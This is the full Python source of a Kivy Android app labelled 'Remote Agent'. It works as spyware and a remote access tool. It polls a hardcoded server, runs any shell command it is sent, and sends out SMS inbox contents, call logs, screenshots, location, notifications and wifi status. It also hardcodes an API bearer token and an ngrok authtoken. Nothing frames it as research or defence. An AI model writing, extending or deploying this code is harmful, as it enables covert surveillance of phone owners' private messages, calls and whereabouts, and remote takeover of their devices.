 from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
import requests
import threading
import subprocess
import platform
import time
import os
import stat
import shutil
import json

SERVER = "http://100.115.203.11:5000"
TOKEN = "mysecrettoken123"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}
POLL_INTERVAL = 5
NGROK_TOKEN = "26JzDAMkcitPetc0lVg88yAkOdJ_2nXynfGo97SU2jkyz8Wrs"

# ── auto reconnect ────────────────────────────────────────

def check_connection():
    while True:
        try:
            requests.get(
                f"{SERVER}/status",
                headers=HEADERS,
                timeout=5
            )
        except:
            print("[-] Server unreachable, retrying...")
            time.sleep(30)
            register()
        time.sleep(60)

# ── battery monitor ───────────────────────────────────────

def monitor_battery(status_label):
    while True:
        try:
            result = subprocess.run(
                "dumpsys battery | grep level",
                shell=True,
                capture_output=True,
                text=True
            )
            level = result.stdout.strip()
            if level:
                number = int(''.join(filter(str.isdigit, level)))
                if number <= 20:
                    requests.post(
                        f"{SERVER}/result",
                        json={
                            "type": "battery_alert",
                            "output": f"⚠️ Battery low: {number}%"
                        },
                        headers=HEADERS,
                        timeout=10
                    )
                    Clock.schedule_once(
                        lambda dt: setattr(
                            status_label, "text",
                            f"⚠️ Battery low: {number}%"
                        )
                    )
        except Exception as e:
            print(f"[-] Battery error: {e}")
        time.sleep(300)  # Check every 5 minutes

# ── location tracking ─────────────────────────────────────

def track_location():
    while True:
        try:
            result = subprocess.run(
                "dumpsys location | grep 'last known'",
                shell=True,
                capture_output=True,
                text=True
            )
            location = result.stdout.strip()
            if location:
                requests.post(
                    f"{SERVER}/result",
                    json={
                        "type": "location",
                        "output": location
                    },
                    headers=HEADERS,
                    timeout=10
                )
        except Exception as e:
            print(f"[-] Location error: {e}")
        time.sleep(600)  # Every 10 minutes

# ── screenshot ────────────────────────────────────────────

def take_screenshot():
    try:
        subprocess.run(
            "screencap -p /sdcard/screen.png",
            shell=True, timeout=10
        )
        # Read image and send as base64
        import base64
        with open("/sdcard/screen.png", "rb") as f:
            img_data = base64.b64encode(f.read()).decode()
        requests.post(
            f"{SERVER}/result",
            json={
                "type": "screenshot",
                "output": img_data
            },
            headers=HEADERS,
            timeout=30
        )
        return "Screenshot sent!"
    except Exception as e:
        return f"Screenshot error: {e}"

# ── sms reader ────────────────────────────────────────────

def read_sms():
    try:
        result = subprocess.run(
            "content query --uri content://sms/inbox "
            "--projection address,body,date "
            "--sort date DESC LIMIT 10",
            shell=True,
            capture_output=True,
            text=True
        )
        return result.stdout or "No SMS found"
    except Exception as e:
        return f"SMS error: {e}"

# ── call logs ─────────────────────────────────────────────

def read_call_logs():
    try:
        result = subprocess.run(
            "content query --uri content://call_log/calls "
            "--projection number,type,date,duration "
            "--sort date DESC LIMIT 10",
            shell=True,
            capture_output=True,
            text=True
        )
        return result.stdout or "No call logs found"
    except Exception as e:
        return f"Call log error: {e}"

# ── wifi monitor ──────────────────────────────────────────

def monitor_wifi(status_label):
    last_status = None
    while True:
        try:
            result = subprocess.run(
                "dumpsys wifi | grep 'mWifiInfo'",
                shell=True,
                capture_output=True,
                text=True
            )
            wifi_info = result.stdout.strip()
            current_status = "connected" if "SSID" in wifi_info else "disconnected"

            if current_status != last_status:
                requests.post(
                    f"{SERVER}/result",
                    json={
                        "type": "wifi_status",
                        "output": f"WiFi {current_status}: {wifi_info}"
                    },
                    headers=HEADERS,
                    timeout=10
                )
                Clock.schedule_once(
                    lambda dt, s=current_status: setattr(
                        status_label, "text",
                        f"WiFi: {s}"
                    )
                )
                last_status = current_status
        except Exception as e:
            print(f"[-] WiFi error: {e}")
        time.sleep(60)

# ── notification monitor ──────────────────────────────────

def monitor_notifications():
    while True:
        try:
            result = subprocess.run(
                "dumpsys notification | grep 'pkg='",
                shell=True,
                capture_output=True,
                text=True
            )
            notifs = result.stdout.strip()
            if notifs:
                requests.post(
                    f"{SERVER}/result",
                    json={
                        "type": "notifications",
                        "output": notifs
                    },
                    headers=HEADERS,
                    timeout=10
                )
        except Exception as e:
            print(f"[-] Notification error: {e}")
        time.sleep(60)

# ── device info ───────────────────────────────────────────

def get_device_info():
    return {
        "os": platform.system(),
        "device": platform.node(),
        "release": platform.release(),
        "status": "online"
    }

# ── server communication ──────────────────────────────────

def register(tunnel_url=None):
    try:
        info = get_device_info()
        if tunnel_url:
            info["tunnel"] = tunnel_url
        requests.post(
            f"{SERVER}/register",
            json=info,
            headers=HEADERS,
            timeout=10
        )
        print(f"[+] Registered")
    except Exception as e:
        print(f"[-] Register error: {e}")

def run_command(cmd):
    # Handle special commands
    if cmd == "screenshot":
        return take_screenshot()
    elif cmd == "sms":
        return read_sms()
    elif cmd == "calls":
        return read_call_logs()
    else:
        try:
            result = subprocess.run(
                cmd, shell=True,
                capture_output=True,
                text=True, timeout=15
            )
            return result.stdout or result.stderr or "(no output)"
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return str(e)

def send_result(cmd, output):
    try:
        requests.post(
            f"{SERVER}/result",
            json={"command": cmd, "output": output},
            headers=HEADERS,
            timeout=10
        )
    except Exception as e:
        print(f"[-] Result error: {e}")

def poll_loop(status_label):
    while True:
        try:
            res = requests.get(
                f"{SERVER}/poll",
                headers=HEADERS,
                timeout=10
            )
            cmd = res.json().get("command")
            if cmd:
                Clock.schedule_once(
                    lambda dt, c=cmd: setattr(
                        status_label, "text",
                        f"Running:\n{c}"
                    )
                )
                output = run_command(cmd)
                send_result(cmd, output)
                Clock.schedule_once(
                    lambda dt, o=output: setattr(
                        status_label, "text",
                        f"Last result:\n{o[:300]}"
                    )
                )
        except Exception as e:
            Clock.schedule_once(
                lambda dt, err=str(e): setattr(
                    status_label, "text",
                    f"Poll error:\n{err}"
                )
            )
        time.sleep(POLL_INTERVAL)

# ── startup ───────────────────────────────────────────────

def startup(status_label):
    def update(msg):
        Clock.schedule_once(
            lambda dt: setattr(status_label, "text", msg)
        )

    update("Starting agent...")
    register()
    update("Online! Waiting for commands...")

    # Start all monitoring threads
    threading.Thread(
        target=monitor_battery,
        args=(status_label,),
        daemon=True
    ).start()

    threading.Thread(
        target=track_location,
        daemon=True
    ).start()

    threading.Thread(
        target=monitor_wifi,
        args=(status_label,),
        daemon=True
    ).start()

    threading.Thread(
        target=monitor_notifications,
        daemon=True
    ).start()

    threading.Thread(
        target=check_connection,
        daemon=True
    ).start()

    # Start main poll loop
    poll_loop(status_label)

# ── kivy app ──────────────────────────────────────────────

class AgentApp(App):
    def build(self):
        layout = BoxLayout(
            orientation="vertical",
            padding=15, spacing=10
        )
        title = Label(
            text="Remote Agent",
            size_hint_y=None, height=40,
            bold=True, font_size=20
        )
        self.status = Label(
            text="Starting...",
            halign="left",
            valign="top",
            text_size=(None, None)
        )
        scroll = ScrollView()
        scroll.add_widget(self.status)
        layout.add_widget(title)
        layout.add_widget(scroll)

        threading.Thread(
            target=startup,
            args=(self.status,),
            daemon=True
        ).start()

        return layout

if __name__ == "__main__":
    AgentApp().run()
